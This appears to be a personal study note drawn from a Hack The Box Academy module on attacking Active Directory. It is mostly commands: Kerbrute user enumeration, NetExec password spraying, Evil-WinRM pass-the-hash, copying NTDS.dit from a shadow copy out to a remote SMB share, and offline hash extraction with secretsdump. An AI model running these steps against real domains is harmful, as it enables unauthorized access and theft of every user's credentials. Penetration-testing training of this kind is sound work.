After we prepared a list of possible usernames and password list, we can use different tools to validate users or attempt to bruteforce into account, Refer to [[Generating Possible Usernames]] 

-Using Kerbrute to Enumerate valid usernames
```
./kerbrute_linux_amd64 userenum --dc <dcip> --domain <domain> <username_candidate>
```

-Using NetExec to perform Password Attack:
```
netexec smb <dcip> -u <username> -p <passwordlist>
```

After we are in and if we acquire an account with admin privilege, we can capture NTDS.dit and extract hashes for user accounts
Using NetExec is preferred is we are able to obtain the admin account cleartext password, however if such is not viable, one can use Evil-WinRM as PTH is supported with WinRM

-Logging in with Evil-WinRM:
```
evil-winrm -i <dcip> -u <username> -H <Hash>
```

-Using WinRM / PS:
```
net user <username> #check if user have respective privilege
vssadmin CREATE SHADOW /FOR=C: #Important: Markdown Shadow Copy Volume Name
cmd.exe /c copy <SCVolumeName>\Windows\NTDS\NTDS.dit <absdestpath>
Example: cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
#We can now copy file outside, below is example copying via SMB
cmd.exe /c move C:\NTDS\NTDS.dit \\<ip>\<share>
```
Note: If we are to crack NTDS.dit, we must also obtain SYSTEM, Refer to [[Extracting Windows Password Hash]]

-Using NetExec:
```
netexec smb <dcip> -u <username> -p <password> -M ntdsutil
```

-Cracking NTDS.dit:
```
impacket-secretsdump -ntds <ntdsfile> -system <systemfile> LOCAL
```

Ref: https://academy.hackthebox.com/app/module/147/section/1326